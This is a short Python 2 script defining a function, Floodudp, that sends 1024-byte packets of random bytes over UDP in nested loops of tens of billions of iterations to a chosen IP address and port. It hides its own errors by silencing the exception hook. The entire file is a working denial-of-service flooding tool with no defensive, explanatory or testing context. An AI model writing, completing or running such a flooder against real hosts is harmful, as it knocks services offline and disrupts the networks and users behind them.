import socket
import random
import sys

sys.excepthook = lambda *args: None

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
MESSAGE = random._urandom(1024)

def Floodudp(UDP_IP,UDP_PORT):
	for n in range (1,65535):
		for x in range (1000000):
			sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
			print >>sys.stderr, 'sending "%s"  \n'% x